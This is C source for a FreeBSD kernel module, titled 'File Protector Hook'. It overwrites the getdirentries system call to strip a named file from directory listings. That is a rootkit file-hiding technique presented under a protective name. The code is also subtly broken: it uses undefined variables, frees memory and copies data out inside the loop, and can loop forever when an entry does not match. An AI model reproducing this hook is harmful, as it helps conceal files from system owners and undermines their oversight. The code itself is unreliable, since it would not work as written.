/*
 * Name:
 *      File Protector Hook
 * Description:
 *      A system call module that protects files
 * Usage:
 *      TODO: Add usage here
 * Author:
 *      Hai Lang
 * Date Created:
 *      2013-02-15
 * Last Update:
 *      2013-02-24
 *
*/
/* General Headers */
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/sysproto.h>

/* System Call Headers */
#include <sys/syscall.h>
#include <sys/stat.h>

/* Directory Headers */
//#include <dirent.h>

/* Options */
#define KERNDEBUG 1

/* getdirentries hook */
static int getdirentries_hook(struct thread *td, void *syscall_args)
{
    struct getdirentries_args /* {
                int fd,
                char *buf,
                int nbytes,
                long *basep
            }*/*args;
    args = (struct getdirentries_args *)syscall_args; /* receive syscall_args with casting */

    struct dirent *dirptr, *currnode;
    unsigned int transby, count, length;
    int flag = 0;
    /* call the original getdirentries */
    sys_getdirentries(td, syscall_args);
    transby = td->td_retval[0]; // Transferred bytes

    /* Don't bother to do anything if the directory is empty */
    if(transby > 0) {
        /* Allocate memory for dirent struct in kernel space */
        MALLOC(dirptr, struct dirent *, transby, M_TEMP, M_NOWAIT);

        /* Now copy the buf to the dirp in the kernel space */
        copyin(args->buf, dirptr, transby);

        currnode = dirptr;
        count = transby;

        /* Iterate through the directory entries */
        while (count > 0) {
            length = currnode->d_reclen;
            count -= length;

            if (strcmp((char *)&(currnode->d_name), (char *)&hide) == 0){
                if (count != 0) {
                    bcopy((char *)currnode + length, currnode, count);
                    flag = 1;
                }

                /* Adjust the transferred bytes */
                transby -= length;

                /* The last directory entry will have a d_reclen 0, make sure
                 * there won't be an infinite loop
                */
                if (currnode->d_reclen == 0) {
                    count = 0;
                }

                if (count != 0 && flag == 0) {
                    currnode = (struct dirent *)((char *)currnode + length);
                }
                flag = 0;

                /* If anything was modified, the return value should be updated as well */
                td->td_retval[0] = transby;
                /* Copy out the modified date back to the buf in user space */
                copyout(dirp, args->buf, size);

                /* Free kernel allocations */
                FREE(dirp, M_TEMP);
            }
        }
    }
    return(0);
}

/* Prepare sysent to register the new system call */
static struct sysent getdirentries_hook_sysent = {
    4,  /* Number of arguments */
    getdirentries_hook /* implementing function */
};

/* Define the offset in sysent[] where the new system call is to be allocated */
static int offset = NO_SYSCALL; /* Default, using the next available slots offset in sysent table */

/* Event handler function for the new system call */
static int load(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch(cmd) {
        case MOD_LOAD:
            #if KERNDEBUG == 1
            uprintf("System call loaded at offset %d.\n", offset);
            #endif
            sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
            break;
        case MOD_UNLOAD:
            #if KERNDEBUG == 1
            uprintf("System call unloaded from offset %d.\n", offset);
            #endif
            sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
            break;
        default:
            error = EOPNOTSUPP; /* Operation not supported */
            break;
    }

    return(error);
}

/* Declare and register the system call module */
SYSCALL_MODULE(file_protector, &offset, &getdirentries_hook_sysent, load, NULL);
